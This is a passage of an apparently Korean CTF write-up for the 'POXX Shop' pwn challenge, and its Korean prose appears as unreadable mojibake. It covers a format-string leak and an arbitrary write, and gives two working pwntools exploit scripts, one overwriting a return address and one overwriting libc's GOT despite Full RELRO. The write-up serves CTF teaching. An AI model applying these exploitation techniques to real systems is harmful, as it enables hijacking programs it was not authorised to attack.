BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">15</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">176LL</span>);</span><br><span class="line">  buf = &amp;v4;</span><br><span class="line">  *(_QWORD *)nptr = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">7</span>] = <span class="number">0LL</span>;</span><br><span class="line">  initialize(argc, argv, <span class="number">8LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*** POXX Shop! ***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Buy&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Exchange&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Return&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What do you want for return?&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0xA0</span>uLL);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, It&#x27;s impossible.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">110</span>) )</span><br><span class="line">          <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">        v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">        v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        *v7 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì•„ëž˜ 1ë²ˆ ë©”ë‰´ì™€ 2ë²ˆ ë©”ë‰´ì—ì„œ ê°ê° ì·¨ì•½ì ì´ ì¡´ìž¬í•˜ë©°, í•´ë‹¹ ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ ìµìŠ¤í”Œë¡œìž‡ ì½”ë“œ ìž‘ì„±ì´ ê°€ëŠ¥í•˜ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&#x27;n&#x27;</span>) )</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);            <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">  v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">  v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  *v7 = v8;                               <span class="comment">// aaw</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë¨¼ì € 1ë²ˆ ë©”ë‰´ë¥¼ ì‚´íŽ´ë³´ìž. bufì— ìž…ë ¥ì„ ë°›ê³  <code>printf</code>ë¡œ ì¶œë ¥ì„ í•´ì¤€ë‹¤. ì´ ë•Œ fsbê°€ ë°œìƒí•˜ì§€ë§Œ â€˜nâ€™ì„ í•„í„°ë§í•˜ê³  ìžˆê¸° ë•Œë¬¸ì— ìŠ¤íƒ ì£¼ì†Œ leakë§Œ ê°€ëŠ¥í•˜ë‹¤.</p><p>2ë²ˆ ë©”ë‰´ì—ì„œëŠ” <code>*v7 = v8;</code> ì´ êµ¬ë¬¸ì„ í†µí•´ ì›í•˜ëŠ” ì£¼ì†Œì— ì›í•˜ëŠ” ê°’ì„ ì“¸ ìˆ˜ ìžˆë‹¤. ë‹¤ì‹œ ë§í•´ì„œ ìž„ì˜ ì£¼ì†Œ ì“°ê¸°ê°€ ê°€ëŠ¥í•˜ë‹¤.</p><p>ì´ë•Œ <code>strtoul</code>ì„ ì´ìš©í•´ì„œ ì •ìˆ˜ë¡œ êµ¬ì„±ëœ strì„ unsigned longìœ¼ë¡œ ë°”ê¿”ì¤€ë‹¤. </p><p>v7ì— 0x7ffcea69ddf0ë¥¼ ë„£ê³  ì‹¶ë‹¤ë©´? <code>read</code>ì—ì„œ nptrì— í•´ë‹¹ ê°’ì„ ìž…ë ¥í•´ì•¼í•œë‹¤. ê·¸ëŸ¼ <code>strtoul</code> í•¨ìˆ˜ì˜ ì¸ìžëŠ” ì•„ëž˜ì™€ ê°™ì´ ë“¤ì–´ê°€ê²Œ ëœë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strtoul@plt (</span><br><span class="line">   $rdi = 0x007ffcea69de19 â†’ &quot;140724241292784&quot;,</span><br><span class="line">   $rsi = 0x00000000000000,</span><br><span class="line">   $rdx = 0x0000000000000a</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ê·¸ë¦¬ê³  ë°˜í™˜ê°’ì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0x007ffcea69ddf0</span><br></pre></td></tr></table></figure><p>ì¶œì œìžì˜ ìž…ìž¥ì—ì„œ v7ì„ ìœ„í•œ nptrì„ ìž…ë ¥ë°›ì„ ë•Œ ì™œ sizeê°€ 0xFì¸ ì´ìœ ë¥¼ ì„¤ëª…í•´ë³´ê² ë‹¤. </p><p>ë³´í†µ ì¸í…” 64bitì—ì„œ ë¦½ì‹œë‚˜ ìŠ¤íƒ ì£¼ì†ŒëŠ” 0x7fë¡œ ì‹œìž‘í•˜ê²Œ ë˜ê³ , ëª»í•´ë„ ì›í•˜ëŠ” ìž…ë ¥í•˜ê³  ì‹¶ì€ ì£¼ì†Œì˜ ë²”ìœ„ëŠ” ì•„ëž˜ì™€ ê°™ì„ ê²ƒì´ë¼ê³  ìƒê°í–ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f0000000000 ~ 0x7fffffffffff</span><br><span class="line">139637976727552 ~ 140737488355327</span><br></pre></td></tr></table></figure><p>ì´ ê°’ì€ <code>strtoul</code> í•¨ìˆ˜ì— ì˜í•´ ë¬¸ìžì—´(ì˜ˆë¥¼ ë“¤ë©´ 140737488355327)ì´ unsigned longìœ¼ë¡œ ë°”ë€Œê²Œ ë˜ë¯€ë¡œ, ìž…ë ¥í•˜ëŠ” ê¸€ìž ìˆ˜ë¥¼ <code>len(&#39;140737488355327&#39;)=15</code>ë¡œ ì œí•œí•˜ê²Œ ë˜ì—ˆë‹¤.</p><p>ë˜í•œ v8ì„ ìœ„í•œ nptr ìž…ë ¥ë„ 0x14ë¡œ íŠ¹ë³„ížˆ ì œí•œí•œ ì´ìœ ê°€ ìžˆë‹¤. ì´ ê¸€ì˜ ì–¸ì¸í…ì´ ì•„ë‹Œ ë‹¤ìŒ ê¸€ì˜ ì–¸ì¸í…ì„ ìœ„í•´ì„œë‹¤. (ì¶œì œí•  ë•Œë¶€í„° ì¸ì§€í•˜ê³  ìžˆì—ˆë˜ ì–¸ì¸í…ì´ê³  ì¼ë¶€ëŸ¬ ìž…ë ¥ í¬ê¸°ë¥¼ 0x14ë¡œ ë‘ê³  ì–¸ì¸í…ì„ ë°©ì§€í•˜ì§€ ì•Šì•˜ë‹¤.) </p><p>ì´ì— ê´€í•´ì„œëŠ” ë‹¤ìŒ ê¸€ì—ì„œ ì„¤ëª…í•˜ë„ë¡ í•œë‹¤.</p><h2 id="Vunlerability"><a href="#Vunlerability" class="headerlink" title="Vunlerability"></a>Vunlerability</h2><p>ì•„ë¬´ë¦¬ ë´ë„ bofëŠ” í„°ì§€ì§€ ì•ŠëŠ”ë‹¤. ìž„ì˜ ì£¼ì†Œ ì“°ê¸°ì™€ ìŠ¤íƒ ì£¼ì†Œ leakì„ ì´ìš©í•˜ì—¬ Exploitì„ ì§„í–‰í•´ë³´ìž.</p><p>ìŠ¤íƒì— ìžˆëŠ” ì£¼ì†Œë¥¼ ëª¨ë‘ ì¶œë ¥í•  ìˆ˜ ìžˆë‹¤ëŠ” ê²ƒì€ ê°•ë ¥í•œ ì·¨ì•½ì ì´ë‹¤. pie base, libc base, stack address ë“±ì„ ë°”ë¡œ êµ¬í•  ìˆ˜ ìžˆê¸° ë•Œë¬¸ì´ë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ì¸í…ê³¼ ì–¸ì¸í… í•˜ë‚˜ì”© ì†Œê°œí•œë‹¤. ì¸í…ì€ ìŠ¤íƒ retë¥¼ gift í•¨ìˆ˜ë¡œ ë®ëŠ” ê²ƒì´ë‹¤. ì´ ë¬¸ì œëŠ” ì˜ˆì„  ë•Œ ëƒˆë˜ ë¬¸ì œë¥¼ ì‚´ì§ ë°”ê¿”ì„œ ë‚¸ ë¬¸ì  ë° ì˜ˆì„  ë•Œ í’€ì–´ì£¼ì‹  ë¶„ë“¤ì´ ëª¨ë‘ ë˜‘ê°™ì€ ë°©ì‹(ì–¸ì¸í…)ìœ¼ë¡œ í‘¸ì…”ì„œ ê·¸ ë¶€ë¶„ì„ íŒ¨ì¹˜í•´ì„œ ëƒˆë‹¤. </p><p>ëª©í‘œëŠ” 1. íŒ¨ì¹˜ë¥¼ í†µí•´ ì˜ˆì„  ë•Œì˜ ì–¸ì¸í… í’€ì´ê°€ ë¶ˆê°€ëŠ¥ í•œ ê²ƒ, 2. í¬ë„ˆë¸” ì˜¬í´ ë°©ì§€ ì˜€ë‹¤. ì˜ˆì„  ë•Œì˜ ì–¸ì¸í…ì€ main í•¨ìˆ˜ê°€ <code>return 0</code>ìœ¼ë¡œ ì¢…ë£Œë˜ì–´ì„œ ìŠ¤íƒ retë¥¼ giftí•¨ìˆ˜ ì£¼ì†Œë¡œ ë°”ê¿”ì„œ í’€ì´í•˜ëŠ” ê²ƒì´ë‹¤. ì´ê²ƒì„ ë°©ì§€í•˜ê¸° ìœ„í•´ mainì´ ì¢…ë£Œí•˜ëŠ” ë¶€ë¶„ì„ <code>exit(0)</code>ìœ¼ë¡œ ë³€ê²½í•˜ì˜€ë‹¤. ë³¸ì„  ë¬¸ì œë¥¼ í’€ì´í•  ë•Œ read í•¨ìˆ˜ì˜ retë¥¼ ë®ì§€ ì•Šê³  í’€ì´ë¥¼ í–ˆìœ¼ë‚˜ í•´ë‹¹ ë°©ì‹ì€ ìµìŠ¤í•˜ëŠ”ë° ì˜¤ëžœ ì‹œê°„ì´ ê±¸ë ¤ì„œ ë‹¤ë¥¸ ìµìŠ¤ ë°©ì‹ì„ íƒìƒ‰í•˜ì˜€ë‹¤. ê²°êµ­ ì˜ˆì„  ì–¸ì¸í…ê³¼ ë¹„ìŠ·í•œ ë°©ì‹ì˜ í’€ì´ë¥¼ ë³¸ì„  ì¸í…ìœ¼ë¡œ ì±„íƒí•˜ì˜€ë‹¤. ìž¬ë°ŒëŠ” ê²ƒì€ ëŒ€íšŒ ëë‚˜ê³  í•´ë‹¹ ë¬¸ì œë¥¼ í’€ì´í•˜ë ¤ê³  í•˜ì‹  ë¶„ì˜ ìµìŠ¤ ì½”ë“œë¥¼ ì‚´íŽ´ë´¤ëŠ”ë° ì´ ë°©ë²•ì´ ì•„ë‹ˆë¼ ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ ì‹œë„í•˜ê³  ê³„ì…¨ë‹¤.. ì´ ë°©ë²•ë„ í•´ë‹¹ ê¸€ì— ì†Œê°œí•˜ë„ë¡ í•˜ê² ë‹¤.</p><h2 id="Exploit-Scnario-1-intend"><a href="#Exploit-Scnario-1-intend" class="headerlink" title="Exploit Scnario 1 (intend)"></a>Exploit Scnario 1 (intend)</h2><ol><li>stack addressë¥¼ êµ¬í•œ ë’¤, loop íšŸìˆ˜ ë³€ê²½</li><li>pie base êµ¬í•˜ê¸°</li><li>bufë¥¼ read retë¡œ ë³€ê²½ í›„ gift ìž…ë ¥ (read retë¥¼ gift)</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;43.201.142.219&#x27;, 49166)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">pause()</span><br><span class="line">Exchange(stack_leak + <span class="number">0xb8</span>, stack_leak - <span class="number">0x8</span>) <span class="comment"># buf -&gt; read ret</span></span><br><span class="line">Buy(p64(e.sym[<span class="string">&#x27;gift&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="loop-íšŸìˆ˜-ë³€ê²½"><a href="#loop-íšŸìˆ˜-ë³€ê²½" class="headerlink" title="loop íšŸìˆ˜ ë³€ê²½"></a>loop íšŸìˆ˜ ë³€ê²½</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1)</span><br><span class="line">b&#x27;\xff\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xf6\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xff\xff\xff\xff\xf6\xff\xff\xff&#x27;</span><br></pre></td></tr></table></figure><p>ìœ„ ë°”ì´íŠ¸ ë¬¸ìžì—´ì„ long long intë¡œ unpackí•˜ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;q&#x27;, (struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)))</span><br><span class="line">(-38654705665,)</span><br></pre></td></tr></table></figure><p>ì°¸ê³ ë¡œ êµ³ì´ loop íšŸìˆ˜ë¥¼ ë³€ê²½í•˜ì§€ ì•Šì•„ë„ ëœë‹¤. ê·¸ ì´ìœ ëŠ” ìš°ë¦¬ëŠ” stackê³¼ pieë§Œ êµ¬í•˜ë©´ ë˜ëŠ”ë° fsbê°€ í„°ì§ˆ ë•Œ ê¸€ìž ìˆ˜ê°€ ì¶©ë¶„í•˜ê¸° ë•Œë¬¸ì´ë‹¤.</p><h2 id="Exploit-Scnario-2"><a href="#Exploit-Scnario-2" class="headerlink" title="Exploit Scnario 2"></a>Exploit Scnario 2</h2><ol><li>stack addressë¥¼ êµ¬í•œ ë’¤, loop íšŸìˆ˜ ë³€ê²½</li><li>libc base êµ¬í•˜ê¸°</li><li>pie base êµ¬í•˜ê¸°</li><li><code>*ABS*@got.plt</code>ë¥¼ gift í•¨ìˆ˜ ì£¼ì†Œë¡œ ë®ê¸° (got overwriting)</li></ol><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">pause()</span><br><span class="line">Buy(<span class="string">&#x27;%37$p_&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x23290</span></span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc.address)) <span class="comment"># libc base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [4]</span></span><br><span class="line">abs_got = libc.address + <span class="number">0x1d8050</span></span><br><span class="line">info(<span class="string">&#x27;abs got :: &#x27;</span> + <span class="built_in">hex</span>(abs_got))</span><br><span class="line"></span><br><span class="line">Exchange(abs_got, e.sym[<span class="string">&#x27;gift&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="GOT-overwriting"><a href="#GOT-overwriting" class="headerlink" title="GOT overwriting"></a>GOT overwriting</h3><p>Full RELROìž„ì—ë„ GOT overwritingì´ ê°€ëŠ¥í•˜ë‹¤.</p><p>putsì˜ êµ¬í˜„ ì´ˆë°˜ë¶€ë¥¼ gdbì—ì„œ í™•ì¸í•˜ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ab33aa0 &lt;puts&gt;:       endbr64</span><br><span class="line">0x7fa31ab33aa4 &lt;puts+4&gt;:     push   r14</span><br><span class="line">0x7fa31ab33aa6 &lt;puts+6&gt;:     push   r13</span><br><span class="line">0x7fa31ab33aa8 &lt;puts+8&gt;:     push   r12</span><br><span class="line">0x7fa31ab33aaa &lt;puts+10&gt;:    mov    r12,rdi</span><br><span class="line">0x7fa31ab33aad &lt;puts+13&gt;:    push   rbp</span><br><span class="line">0x7fa31ab33aae &lt;puts+14&gt;:    push   rbx</span><br><span class="line">0x7fa31ab33aaf &lt;puts+15&gt;:    sub    rsp,0x10</span><br><span class="line">0x7fa31ab33ab3 &lt;puts+19&gt;:    call   0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;</span><br></pre></td></tr></table></figure><p><code>*ABS*+0x9d080@plt</code> ì„ callí•˜ê³  ìžˆëŠ”ë°, ì•ˆì— ë“¤ì–´ê°€ì„œ í™•ì¸í•´ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;:  endbr64</span><br><span class="line">0x7fa31aae12b4 &lt;*ABS*+0x9d080@plt+4&gt;:        bnd jmp QWORD PTR [rip+0x1b5d95]        # 0x7fa31ac97050 &lt;*ABS*@got.plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gefâž¤  vm 